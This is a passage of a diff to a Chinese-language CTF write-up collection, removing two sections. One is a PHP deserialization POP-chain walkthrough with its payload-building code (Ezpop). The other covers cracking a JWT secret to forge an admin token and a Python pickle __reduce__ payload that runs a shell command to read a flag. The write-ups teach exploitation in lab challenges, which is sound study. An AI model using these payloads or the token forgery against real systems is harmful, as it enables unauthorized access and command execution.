-            @unserialize($_GET['pop']);
-        }
-        else{
-            $a=new Show;
-            highlight_file(__FILE__);
-        }
-    ```
-
-- 代码审计
-
-    从非定义部分的代码开始审查。
-
-    ```php
-        if(isset($_GET['pop'])){
-            @unserialize($_GET['pop']);
-        }
-        else{
-            $a=new Show;
-            highlight_file(__FILE__);
-        }
-    ```
-
-    在传入参数pop被设置时对其进行反序列化，那么再查看此前定义的类中哪些具有和反序列化相关的魔术方法，调用这些魔术方法中设置的代码，就可以执行此处反序列化之外更多的代码，从而实现我们读取flag.php中flag的要求。
-
-    ```php
-        class Modifier {
-            protected  $var;
-            public function append($value){
-                include($value);
-            }
-            public function __invoke(){
-                $this->append($this->var);
-            }
-        }
-    ```
-
-    Modifier类中append()方法会将传入参数包含，而此处魔术方法__invoke中设置了将Modifier类中的var属性作为传入值来调用append()函数，所以在这里需要让属性var的值为flag.php，再触发魔术方法__invoke即可。
-
-    魔术方法__invoke被自动调用的条件是类被当成一个函数被调用，故接着来寻找和函数调用有关的代码。
-
-    ```php
-        class Show{
-            public $source;
-            public $str;
-            public function __construct($file='index.php'){
-                $this->source = $file;
-                echo 'Welcome to '.$this->source."<br>";
-            }
-            public function __toString(){
-                return $this->str->source;
-            }
-        
-            public function __wakeup(){
-                if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
-                    echo "hacker";
-                    $this->source = "index.php";
-                }
-            }
-        }
-    ```
-
-    在Test类中有两个魔法函数__construct和__get，但魔法函数__construct这里用不上只需要关注魔法函数__get就好。魔法函数__get中设置了属性p会被当做函数调用，刚好符合前面Modifier类中的要求。故需要再触发魔法函数__get即可
-
-    魔法函数__get会在访问类中一个不存在的属性时自动调用，那就需要寻找和调用属性相关的代码。
-
-    ```php
-        class Test{
-            public $p;
-            public function __construct(){
-                $this->p = array();
-            }
-            public function __get($key){
-                $function = $this->p;
-                return $function();
-            }
-        }
-    ```
-
-    Show类中有三个魔术方法
-
-    在魔术方法__toString中会返回属性str中的属性source，如果刚刚提到的source属性不存在，那么就符合了Test类中的要求
-
-    魔术方法__toString在类被当做一个字符串处理时会被自动调用，在魔术方法__wakeup则将属性source传入正则匹配函数preg_match()，在这个函数中source属性就被当做字符串处理。
-
-    最终这个魔术方法__wakeup又在类被反序列化时自动调用。
-
-    这样从Test类中append()方法到Show类中的魔术方法__wakup就形成了一条调用链，这就是POP的一个使用样例，而题目——Ezpop就说明了这题设计的知识。
-
-    整个过程：
-
-    反序列化->调用Show类中魔术方法__wakeup->preg_match()函数对Show类的属性source处理->调用Show类中魔术方法__toString->返回Show类的属性str中的属性source(此时这里属性source并不存在)->调用Test类中魔术方法__get->返回Test类的属性p的函数调用结果->调用Modifier类中魔术方法__invoke->include()函数包含目标文件(flag.php)
-
-    构造payload的代码(读取flag.php中的flag需要伪协议)：
-
-    ```php
-        <?php
-        class Modifier {
-            protected  $var="flag.php";
-        }
-        class Show{
-            public $source;
-            public $str;
-        }
-        class Test{
-            public $p;
-        }
-        $a = new Show();
-        $b= new Show();
-        $a->source=$b;
-        $b->str=new Test();
-        ($b->str)->p=new Modifier();
-        echo urlencode(serialize($a));
-    ```
 
 ## 强网杯2019-高明的黑客(脚本编写)
 
@@ -3229,105 +3342,6 @@ url解码之后就是 `?code=phpinfo();`
 6. 爆破脚本
    
    [sqli_blind.py](./sqli_blind.py)
-
-## CISCN2019 华北赛区 Day1 Web2 ikun(JWT python反序列化)
-
-1. 进来看到提示购买lv6，直接翻页找不到,翻页时发现url里有页面索引,直接脚本跑
-
-    ```python
-    url = 'http://4a471f3e-6f7e-46ab-a7b3-0dec29398943.node5.buuoj.cn:81/shop?page='
-    for i in range(600):
-        urls = url + str(i)
-        res = requests.get(urls)
-        if 'lv6.png' in res.text:
-            print('lv6 in ' + str(i) +' page\n')
-            break
-    ```
-
-2. lv6在181页，注册账号购买，钱不够，bp抓包，发现有折扣信息，修改折扣
-3. 进入一个新的页面`/b1g_m4mber`,提示只能由admin访问，抓包发现请求头里面有JWT(JSON Web Token,用于身份认证)，用`c-jwt-cracker`破解密钥
-    ```bash
-    ./jwtcrack 密文
-    ```
-
-    得到密钥后，需要生成新的jwt，这时可以用brup的JSON Web Token(修改JWT之后，会自动修改抓取数据包中的JWT),将用户名改为admin，放行，成功访问，查看网页源码发现了压缩包
-
-4. 题目一开始也提示了python 和 pickle，即python的反序列化漏洞，
-   
-   关于pickle
-
-    ```text
-    1. 持续化模块：就是让数据持久化保存。
-
-    pickle模块是Python专用的持久化模块，可以持久化包括自定义类在内的各种数据，比较适合Python本身复杂数据的存贮。
-    但是持久化后的字串是不可认读的，并且只能用于Python环境，不能用作与其它语言进行数据交换。
-
-    2. pickle 模块的作用
-
-    把 Python 对象直接保存到文件里，而不需要先把它们转化为字符串再保存，也不需要用底层的文件访问操作，直接把它们写入到一个二进制文件里。pickle 模块会创建一个 Python 语言专用的二进制格式，不需要使用者考虑任何文件细节，它会帮你完成读写对象操作。用pickle比你打开文件、转换数据格式并写入这样的操作要节省不少代码行。
-
-    3. 主要方法
-    在pickle中dumps()和loads()操作的是bytes类型，而在使用dump()和lload()读写文件时，要使用rb或wb模式，也就是只接收bytes类型的数据。
-    dumps(): 写
-    loads(): 读
-    loads() 和 dumps() 操作对象都是string
-    load() 和 dump() 操作对象都是文件
-    ```
-
-    漏洞在admin.py文件中。
-
-    ```python
-    import tornado.web
-    from sshop.base import BaseHandler
-    import pickle
-    import urllib
-
-
-    class AdminHandler(BaseHandler):
-        @tornado.web.authenticated
-        def get(self, *args, **kwargs):
-            if self.current_user == "admin":
-                return self.render('form.html', res='This is Black Technology!', member=0)
-            else:
-                return self.render('no_ass.html')
-
-        @tornado.web.authenticated
-        def post(self, *args, **kwargs):
-            try:
-                become = self.get_argument('become')
-                p = pickle.loads(urllib.unquote(become))
-                return self.render('form.html', res=p, member=1)
-            except:
-                return self.render('form.html', res='This is Black Technology!', member=0)
-    ```
-
-    借用别人的wp：
-    
-    思路是我们构建一个类，类里面的`__reduce__`魔术方法会在该类被反序列化的时候会被调用,而在`__reduce__`方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码.
-
-    破解脚本。
-
-    ```python
-    import pickle
-    import urllib
-    import commands
-    
-    
-    class payload(object):
-        def __reduce__(self):
-            return (commands.getoutput,('cat /flag.txt',))
-            # return(commands.getoutput,('ls /'))
-            # return (eval, ("open('/flag.txt','r').read()",))
-    
-    
-    a = pickle.dumps(payload())
-    a = urllib.quote(a)
-    print(a)
-    ```
-
-    得到payload后，利用bp修改become的值为payload
-
-    *注意 : 每次发送请求都要将jwt中的username改为admin*
 
 ## 红明谷CTF 2021 webshell(php系统命令执行)
 
